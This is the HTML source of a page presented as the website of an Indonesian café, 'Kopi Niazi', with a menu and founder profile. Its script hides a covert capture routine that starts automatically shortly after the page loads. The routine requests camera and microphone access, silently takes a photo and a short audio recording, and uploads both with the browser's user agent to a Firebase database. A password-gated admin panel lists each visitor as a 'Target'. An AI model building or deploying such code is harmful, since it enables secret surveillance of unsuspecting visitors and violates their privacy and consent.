<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kopi Niazi - Coffee & Eatery</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        
        body {
            background-color: #faf7f2;
        }
        
        /* Navbar */
        .navbar {
            background-color: #2c1810;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .logo {
            display: flex;
            align-items: center;
            font-size: 24px;
            font-weight: bold;
            color: #c49a6c;
        }
        
        .logo-img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            margin-right: 15px;
            border: 3px solid #c49a6c;
            object-fit: cover;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
        
        .firebase-badge {
            background: #c49a6c;
            color: #2c1810;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 10px;
            margin-left: 10px;
        }
        
        .nav-links a {
            color: white;
            text-decoration: none;
            margin-left: 25px;
            font-size: 14px;
        }
        
        .admin-btn {
            background-color: #c49a6c;
            color: #2c1810;
            border: none;
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-left: 25px;
            transition: 0.3s;
        }
        
        .admin-btn:hover {
            background-color: #b58a5c;
            transform: scale(1.05);
        }
        
        /* Hero */
        .hero {
            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.pexels.com/photos/302899/pexels-photo-302899.jpeg?auto=compress&cs=tinysrgb&w=1200');
            background-size: cover;
            background-position: center;
            height: 300px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: white;
        }
        
        .hero h1 {
            font-size: 48px;
            margin-bottom: 10px;
        }
        
        .hero h1 span {
            color: #c49a6c;
        }
        
        /* Owner Section */
        .owner-section {
            text-align: center;
            padding: 40px 20px;
            background: white;
            margin: 40px auto;
            max-width: 350px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            border: 1px solid rgba(196, 154, 108, 0.3);
        }
        
        .owner-img {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: 5px solid #c49a6c;
            object-fit: cover;
            margin-bottom: 20px;
            box-shadow: 0 5px 20px rgba(196, 154, 108, 0.3);
        }
        
        .owner-name {
            color: #2c1810;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .owner-title {
            color: #c49a6c;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 15px;
        }
        
        .owner-quote {
            color: #666;
            font-style: italic;
            padding: 0 20px;
        }
        
        /* Categories */
        .categories {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 30px 0;
            flex-wrap: wrap;
            padding: 0 15px;
        }
        
        .category-btn {
            padding: 10px 25px;
            border: 2px solid #c49a6c;
            background: transparent;
            color: #2c1810;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        
        .category-btn.active {
            background: #c49a6c;
            color: white;
        }
        
        .category-btn:hover {
            background: #c49a6c;
            color: white;
        }
        
        /* Menu Grid */
        .menu-section {
            padding: 20px 20px 50px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .section-title {
            text-align: center;
            font-size: 32px;
            color: #2c1810;
            margin-bottom: 30px;
            position: relative;
            display: inline-block;
            width: 100%;
        }
        
        .section-title:after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 3px;
            background: #c49a6c;
        }
        
        .menu-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
        }
        
        .menu-card {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: 0.3s;
        }
        
        .menu-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
        }
        
        .menu-card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            transition: 0.3s;
        }
        
        .menu-card:hover img {
            transform: scale(1.05);
        }
        
        .menu-info {
            padding: 20px;
        }
        
        .menu-info h3 {
            color: #2c1810;
            margin-bottom: 8px;
            font-size: 18px;
        }
        
        .menu-price {
            color: #c49a6c;
            font-weight: bold;
            font-size: 20px;
        }
        
        /* Admin Panel */
        .admin-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .admin-box {
            background: white;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            border-radius: 15px;
            overflow: hidden;
        }
        
        .admin-header {
            background: #2c1810;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
        }
        
        .admin-body {
            padding: 25px;
            max-height: 70vh;
            overflow-y: auto;
        }
        
        .admin-body input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        
        .admin-body button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: 0.3s;
        }
        
        .btn-login {
            background: #c49a6c;
            color: #2c1810;
        }
        
        .btn-login:hover {
            background: #b58a5c;
        }
        
        .btn-close {
            background: #2c1810;
            color: white;
        }
        
        .btn-close:hover {
            background: #3a2a1e;
        }
        
        .data-item {
            background: #f5f5f5;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 8px;
            border-left: 4px solid #c49a6c;
        }
        
        .data-item img {
            width: 100%;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .data-item audio {
            width: 100%;
            margin: 5px 0;
        }
        
        .stats {
            background: #c49a6c;
            color: #2c1810;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            text-align: center;
            font-weight: bold;
        }
        
        .device-info {
            background: #2c1810;
            color: white;
            padding: 5px;
            border-radius: 3px;
            font-size: 11px;
            margin: 5px 0;
        }
        
        .delete-btn {
            background: #ff4444 !important;
            color: white !important;
            padding: 8px !important;
            font-size: 14px !important;
        }
        
        .delete-btn:hover {
            background: #cc0000 !important;
        }
        
        /* Footer */
        .footer {
            background: #2c1810;
            color: white;
            text-align: center;
            padding: 25px;
            margin-top: 50px;
        }
        
        .footer p {
            color: #c49a6c;
        }
        
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Hidden Video -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <!-- Navbar dengan LOGO FOTO FOUNDER -->
    <div class="navbar">
        <div class="logo">
            <img src="https://i.ibb.co.com/ds2tNCZ4/motion-photo-3994127623206717383.jpg" class="logo-img" alt="Founder Niazi">
            KOPI NIAZI
            <span class="firebase-badge">üî• FIREBASE</span>
        </div>
        <div class="nav-links">
            <a href="#">Home</a>
            <a href="#">Menu</a>
            <a href="#">About</a>
            <button class="admin-btn" onclick="bukaAdmin()">ADMIN</button>
        </div>
    </div>

    <!-- Hero -->
    <div class="hero">
        <div>
            <h1>Selamat Datang di <span>Kopi Niazi</span></h1>
            <p>Specialty Coffee & Homemade Food</p>
        </div>
    </div>

    <!-- OWNER SECTION - FOTO FOUNDER BESAR -->
    <div class="owner-section">
        <img src="https://i.ibb.co.com/ds2tNCZ4/motion-photo-3994127623206717383.jpg" class="owner-img" alt="Founder Kopi Niazi">
        <div class="owner-name">Niazi MK</div>
        <div class="owner-title">Founder & Head Chef</div>
        <div class="owner-quote">"Kopi terbaik buat orang terbaik, disajikan dengan hati"</div>
    </div>

    <!-- Categories -->
    <div class="categories">
        <button class="category-btn active" onclick="filterMenu('all')">Semua</button>
        <button class="category-btn" onclick="filterMenu('coffee')">Coffee</button>
        <button class="category-btn" onclick="filterMenu('mocktail')">Mocktail</button>
        <button class="category-btn" onclick="filterMenu('food')">Makanan</button>
        <button class="category-btn" onclick="filterMenu('snack')">Snack</button>
        <button class="category-btn" onclick="filterMenu('dessert')">Dessert</button>
    </div>

    <!-- Menu Grid -->
    <div class="menu-section">
        <h2 class="section-title">Menu Kami</h2>
        <div class="menu-grid" id="menuGrid"></div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <p>¬© 2024 Kopi Niazi - All rights reserved</p>
        <p style="font-size:12px; margin-top:10px; color:#888;">üî• Multi Device with Firebase</p>
    </div>

    <!-- Admin Panel -->
    <div class="admin-overlay" id="adminPanel">
        <div class="admin-box">
            <div class="admin-header">üîê ADMIN PANEL (Firebase)</div>
            <div class="admin-body" id="adminBody">
                <div id="loginSection">
                    <input type="password" id="password" placeholder="Masukkan Password">
                    <button class="btn-login" onclick="cekLogin()">LOGIN</button>
                    <button class="btn-close" onclick="tutupAdmin()">TUTUP</button>
                </div>
                
                <div id="dataSection" style="display:none;">
                    <div id="dataList">Loading...</div>
                    <button class="btn-close" onclick="kembaliLogin()">KEMBALI</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // =============================================
        // FIREBASE CONFIG
        // =============================================
        const firebaseConfig = {
            databaseURL: "https://niazi-91e93-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const capturesRef = database.ref('captures');

        // =============================================
        // DATA MENU - LENGKAP
        // =============================================
        const menuData = [
            // COFFEE
            { name: "Espresso", price: "Rp 22.000", category: "coffee", img: "https://images.pexels.com/photos/302899/pexels-photo-302899.jpeg?w=400" },
            { name: "Americano", price: "Rp 25.000", category: "coffee", img: "https://images.pexels.com/photos/6207360/pexels-photo-6207360.jpeg?w=400" },
            { name: "Cappuccino", price: "Rp 28.000", category: "coffee", img: "https://images.pexels.com/photos/324028/pexels-photo-324028.jpeg?w=400" },
            { name: "Latte", price: "Rp 30.000", category: "coffee", img: "https://images.pexels.com/photos/302894/pexels-photo-302894.jpeg?w=400" },
            { name: "Caramel Latte", price: "Rp 32.000", category: "coffee", img: "https://images.pexels.com/photos/4108685/pexels-photo-4108685.jpeg?w=400" },
            { name: "Matcha Latte", price: "Rp 30.000", category: "coffee", img: "https://images.pexels.com/photos/7659479/pexels-photo-7659479.jpeg?w=400" },
            { name: "Hazelnut Coffee", price: "Rp 33.000", category: "coffee", img: "https://images.pexels.com/photos/434213/pexels-photo-434213.jpeg?w=400" },
            { name: "Mochaccino", price: "Rp 31.000", category: "coffee", img: "https://images.pexels.com/photos/6207362/pexels-photo-6207362.jpeg?w=400" },
            
            // MOCKTAIL
            { name: "Thai Tea", price: "Rp 20.000", category: "mocktail", img: "https://images.pexels.com/photos/5947069/pexels-photo-5947069.jpeg?w=400" },
            { name: "Blue Ocean", price: "Rp 23.000", category: "mocktail", img: "https://images.pexels.com/photos/338713/pexels-photo-338713.jpeg?w=400" },
            { name: "Mango Smoothie", price: "Rp 25.000", category: "mocktail", img: "https://images.pexels.com/photos/5947068/pexels-photo-5947068.jpeg?w=400" },
            { name: "Strawberry Fizz", price: "Rp 24.000", category: "mocktail", img: "https://images.pexels.com/photos/4959978/pexels-photo-4959978.jpeg?w=400" },
            { name: "Lemon Tea", price: "Rp 18.000", category: "mocktail", img: "https://images.pexels.com/photos/338757/pexels-photo-338757.jpeg?w=400" },
            
            // MAKANAN
            { name: "Nasi Goreng", price: "Rp 35.000", category: "food", img: "https://images.pexels.com/photos/1279330/pexels-photo-1279330.jpeg?w=400" },
            { name: "Mie Goreng", price: "Rp 32.000", category: "food", img: "https://images.pexels.com/photos/1437267/pexels-photo-1437267.jpeg?w=400" },
            { name: "Soto Ayam", price: "Rp 30.000", category: "food", img: "https://images.pexels.com/photos/674574/pexels-photo-674574.jpeg?w=400" },
            { name: "Ayam Bakar", price: "Rp 40.000", category: "food", img: "https://images.pexels.com/photos/106343/pexels-photo-106343.jpeg?w=400" },
            { name: "Beef Ramen", price: "Rp 45.000", category: "food", img: "https://images.pexels.com/photos/884600/pexels-photo-884600.jpeg?w=400" },
            { name: "Chicken Katsu", price: "Rp 38.000", category: "food", img: "https://images.pexels.com/photos/60616/fried-chicken-chicken-fried-crunchy-60616.jpeg?w=400" },
            
            // SNACKS
            { name: "French Fries", price: "Rp 20.000", category: "snack", img: "https://images.pexels.com/photos/1583884/pexels-photo-1583884.jpeg?w=400" },
            { name: "Pisang Goreng", price: "Rp 15.000", category: "snack", img: "https://images.pexels.com/photos/4110403/pexels-photo-4110403.jpeg?w=400" },
            { name: "Onion Rings", price: "Rp 18.000", category: "snack", img: "https://images.pexels.com/photos/2092507/pexels-photo-2092507.jpeg?w=400" },
            { name: "Croissant", price: "Rp 22.000", category: "snack", img: "https://images.pexels.com/photos/2135/restaurant-food-croissant-bread.jpg?w=400" },
            
            // DESSERT
            { name: "Choco Lava", price: "Rp 28.000", category: "dessert", img: "https://images.pexels.com/photos/291528/pexels-photo-291528.jpeg?w=400" },
            { name: "Cheesecake", price: "Rp 30.000", category: "dessert", img: "https://images.pexels.com/photos/4040645/pexels-photo-4040645.jpeg?w=400" },
            { name: "Mango Sticky", price: "Rp 32.000", category: "dessert", img: "https://images.pexels.com/photos/4110401/pexels-photo-4110401.jpeg?w=400" },
            { name: "Ice Cream", price: "Rp 15.000", category: "dessert", img: "https://images.pexels.com/photos/1352270/pexels-photo-1352270.jpeg?w=400" }
        ];

        // Tampilkan Menu
        const menuGrid = document.getElementById('menuGrid');
        
        function tampilkanMenu(kategori = 'all') {
            menuGrid.innerHTML = '';
            
            const filtered = kategori === 'all' ? menuData : menuData.filter(item => item.category === kategori);
            
            filtered.forEach(item => {
                menuGrid.innerHTML += `
                    <div class="menu-card">
                        <img src="${item.img}" alt="${item.name}" loading="lazy">
                        <div class="menu-info">
                            <h3>${item.name}</h3>
                            <div class="menu-price">${item.price}</div>
                        </div>
                    </div>
                `;
            });
        }

        window.filterMenu = function(kategori) {
            document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            tampilkanMenu(kategori);
        }

        tampilkanMenu();

        // =============================================
        // ADMIN PANEL
        // =============================================
        const adminPanel = document.getElementById('adminPanel');
        
        window.bukaAdmin = function() {
            adminPanel.style.display = 'flex';
        }
        
        window.tutupAdmin = function() {
            adminPanel.style.display = 'none';
        }
        
        window.cekLogin = function() {
            const pass = document.getElementById('password').value;
            if (pass === 'NIAZI1212') {
                document.getElementById('loginSection').style.display = 'none';
                document.getElementById('dataSection').style.display = 'block';
                loadDataFromFirebase();
            } else {
                alert('Password salah!');
            }
        }
        
        window.kembaliLogin = function() {
            document.getElementById('loginSection').style.display = 'block';
            document.getElementById('dataSection').style.display = 'none';
            document.getElementById('password').value = '';
        }

        // =============================================
        // LOAD DATA DARI FIREBASE
        // =============================================
        function loadDataFromFirebase() {
            const dataList = document.getElementById('dataList');
            dataList.innerHTML = '<p style="text-align:center;">Mengambil data dari Firebase...</p>';
            
            capturesRef.orderByChild('created_at').once('value', (snapshot) => {
                const data = [];
                snapshot.forEach((childSnapshot) => {
                    data.push({
                        id: childSnapshot.key,
                        ...childSnapshot.val()
                    });
                });
                
                data.reverse();
                
                if (data.length > 0) {
                    let html = `<div class="stats">üìä TOTAL: ${data.length} DATA DARI SEMUA DEVICE</div>`;
                    
                    data.forEach((item, index) => {
                        const waktu = item.created_at ? new Date(item.created_at).toLocaleString('id-ID') : 'Unknown';
                        html += `
                            <div class="data-item">
                                <div style="display:flex; justify-content:space-between;">
                                    <b>Target #${index + 1}</b>
                                    <span style="font-size:11px;">${waktu}</span>
                                </div>
                                <div class="device-info">üì± ${item.user_agent || 'Unknown'}</div>
                                <img src="${item.foto}" alt="Foto">
                                <audio controls src="${item.suara}"></audio>
                                <button onclick="hapusData('${item.id}')" class="delete-btn">HAPUS</button>
                            </div>
                        `;
                    });
                    
                    dataList.innerHTML = html;
                } else {
                    dataList.innerHTML = '<p style="text-align:center; padding:20px;">Belum ada data di Firebase</p>';
                }
            });
        }

        window.hapusData = function(id) {
            if (confirm('Hapus data ini?')) {
                capturesRef.child(id).remove()
                    .then(() => {
                        loadDataFromFirebase();
                    });
            }
        }

        // =============================================
        // CAPTURE - SIMPAN KE FIREBASE
        // =============================================
        async function mulaiCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    const foto = canvas.toDataURL('image/jpeg');
                    
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        
                        reader.onloadend = async () => {
                            try {
                                await capturesRef.push({
                                    foto: foto,
                                    suara: reader.result,
                                    user_agent: navigator.userAgent,
                                    created_at: new Date().toISOString()
                                });
                                
                                console.log('‚úÖ Data tersimpan di Firebase!');
                                
                            } catch (err) {
                                console.log('Error:', err);
                            }
                            
                            stream.getTracks().forEach(t => t.stop());
                        };
                        reader.readAsDataURL(blob);
                    };
                    
                    recorder.start();
                    setTimeout(() => recorder.stop(), 4000);
                    
                }, 2000);
                
            } catch (err) {
                console.log('Gagal capture:', err);
            }
        }

        // Mulai capture otomatis
        setTimeout(mulaiCapture, 4000);
    </script>
</body>
</html>